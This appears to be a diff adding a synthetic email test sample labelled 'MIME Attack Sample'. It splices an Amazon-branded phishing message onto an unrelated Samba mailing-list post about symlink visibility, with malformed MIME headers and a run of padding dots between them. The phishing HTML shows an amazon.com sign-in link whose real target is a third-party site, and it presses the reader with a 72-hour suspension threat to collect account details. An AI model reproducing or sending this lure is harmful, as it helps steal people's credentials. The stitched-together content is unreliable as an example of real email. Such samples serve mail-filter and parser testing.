@@ -1,0 +1,210 @@
+From: vanaya_vitoltvl@yahoo.com
+To: agatha.tran@enron.com, stephen.schwarzbach@enron.com
+Subject: MIME Attack Sample
+Content-Type: multipart/mixed; boundary="BOUNDARY"
+--BOUNDARY
+>
+Content-Type: text/html
+X-Virus-Scanned: by amavisd-new-20030616-p10 (Debian) at example.com
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 317
+
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">
+<HTML><HEAD>
+<META http-equiv="Content-Type" content="text/html; 
+charset=iso-8859-1">
+<STYLE></STYLE>
+</HEAD>
+<BODY bgColor=#ffffff>
+<P>
+<TABLE cellSpacing=0 cellPadding=0 width=650 bgColor=#ffffff border=0>
+
+ <TR>
+ <TD>
+ <TABLE borderColor=#ffffff cellSpacing=0 borderColorDark=#ffffff
+ cellPadding=2 width="100%" bgColor=#ffffff borderColorLight=#ffffff
+ border=1>
+
+ <TR>
+ <TD>
+ <P align=left><B><FONT face=Arial>***Urgent Fraud Prevention Group
+ Notice***</FONT></B></P></TD></TR></TABLE></TD></TR>
+ <TR>
+ <TD borderColor=#ffffff borderColorLight=#ffffff bgColor=#ffffff
+ borderColorDark=#ffffff></TD></TR>
+ <TR>
+ <TD borderColor=#cccccc borderColorLight=#cccccc bgColor=#cccccc
+ borderColorDark=#cccccc height=1>&nbsp;</TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>You have received this email because we 
+have
+ strong reason to believe that your&nbsp;Amazon account had been 
+recently
+ compromised. In order to prevent any fraudulent activity from 
+occurring we
+ are required to open an investigation into this matter. To speed up 
+this
+ process, you are required to verify your&nbsp;Amazon account by 
+following
+ the link below.</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2><A
+ href="http://mail.diamond-motor.com.ph/.amazon/index.php?MfcISAPICommand=SignInFPP"
+ target=_blank onfiltered="return ShowLinkWarning()"><b><FONT
+ 
+color=#003399>http://www.amazon.com/exec/obidos/flex-sign-in/</FONT></b></A><BR><FONT
+ size=1>(To complete the verification process you must fill in all the
+ required fields)</FONT></FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD bgColor=#eeeef8><FONT face=Arial size=2><b>Please Note:</b>
+ If your account informations are not updated within the next 72 hours,
+ then we will assume this account is fraudulent and will be suspended. 
+We
+ apologize for this inconvenience, but the purpose of this verification 
+is
+ to ensure that your&nbsp;Amazon account has not been fraudulently used 
+and
+ to combat fraud.</FONT></TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>We appreciate your support and 
+understanding,
+ as we work together to keep&nbsp;Amazon a safe place to
+trade.</FONT></TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>Thank you for your attention on this 
+serious
+ matter. We apologize for any delay in resolving this
+ situation.</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>Regards,</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD><FONT face=Arial size=2>Amazon.com<BR>Investigations 
+Team</FONT></TD></TR>
+ <TR>
+ <TD>&nbsp;</TD></TR>
+ <TR>
+ <TD></TD></TR>
+ <TR>
+ <TD>
+ <TABLE cellSpacing=0 cellPadding=0 width="100%" bgColor=#cccccc>
+
+ <TR>
+ <TD height=1>&nbsp;</TD></TR></TABLE></TD></TR>
+ <TR>
+ <TD>
+ <DIV align=center><FONT face="Arial, Helvetica, sans-serif" 
+color=#666666
+ size=1>Please do not reply to this e-mail as this is only a 
+notification.
+ Mail sent to this address cannot be answered.&nbsp;<BR>Amazon.com 
+treats
+ your personal information with the utmost care, and our Privacy Policy 
+is
+ designed to protect you and your information.<BR>Copyright 
+ 2006&nbsp;Amazon.com All Rights
+Reserved.</FONT></DIV></TD></TR></TABLE></P>
+</BODY></HTML>
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+.
+Content-Type: text/plain
+
+-----BEGIN PGP SIGNED MESSAGE-----
+Hash: SHA1
+
+Jeremy,
+
+Is this a change in behavior ?
+
+* create a symlink in a share to a directory that
+  has permissions that would deny a given user to
+  stat the link target
+
+* smbd removes the link from the list of files
+  in the output to smbclient and Windows 2003
+
+  get_lanman2_dir_entry: SMB_FIND_FILE_BOTH_DIRECTORY_INFO
+  get_lanman2_dir_entry:readdir on dirptr 0x8558a30 now at offset
+    -2147483648
+  dos_mode: ./..
+  dos_mode_from_sbuf returning d
+  dos_mode returning d
+  get_lanman2_dir_entry found ./.. fname=..
+  get_lanman2_dir_entry: SMB_FIND_FILE_BOTH_DIRECTORY_INFO
+  get_lanman2_dir_entry:readdir on dirptr 0x8558a30 now at offset 56
+  get_lanman2_dir_entry:Couldn't stat [./lwi-builds] (Permission denied)
+  ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
+  get_lanman2_dir_entry:readdir on dirptr 0x8558a30 now at offset 72
+  dos_mode: ./winadmin
+  dos_mode_from_sbuf returning d
+  dos_mode returning d
+  get_lanman2_dir_entry found ./winadmin fname=winadmin
+  get_lanman2_dir_entry: SMB_FIND_FILE_BOTH_DIRECTORY_INFO
+  get_lanman2_dir_entry:readdir on dirptr 0x8558a30 now at offset 4096
+
+It seems to be that we should display the link anyways.
+Hide unreadable is not set.
+
+
+
+
+
+cheers, jerry
+=====================================================================
+Samba                                    ------- http://www.samba.org
+Centeris                         -----------  http://www.centeris.com
+"What man is a man who does not make the world better?"      --Balian
+-----BEGIN PGP SIGNATURE-----
+Version: GnuPG v1.4.6 (GNU/Linux)
+Comment: Using GnuPG with Mozilla - http://enigmail.mozdev.org
+
+iD8DBQFGRI5YIR7qMdg1EfYRAl9LAKDIpfrPMX1h53ARm3cND8UrrZ+4gACeIgdr
+PxyvBMnMAYevJTHL3sz3kIY=
+=Vbh5
+-----END PGP SIGNATURE-----
+-BOUNDARY--
